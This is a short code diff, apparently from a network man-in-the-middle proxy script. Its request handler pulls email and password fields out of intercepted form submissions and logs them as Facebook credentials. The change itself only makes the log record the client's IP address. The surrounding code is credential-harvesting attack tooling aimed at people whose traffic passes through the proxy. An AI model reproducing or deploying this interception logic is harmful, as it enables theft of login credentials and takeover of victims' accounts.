@@ -14,7 +14,7 @@ function onRequest(req, res) {
         var email = form["email"] || "?", 
             pass  = form["pass"] || "?";
 
-        log( R(req.Client), " > FACEBOOK > email:", B(email), " pass:'" + B(pass) + "'" );
+        log( R(req.Client.IP), " > FACEBOOK > email:", B(email), " pass:'" + B(pass) + "'" );
 
         headers = res.Headers.split("\r\n")
         for (var i = 0; i < headers.length; i++) {
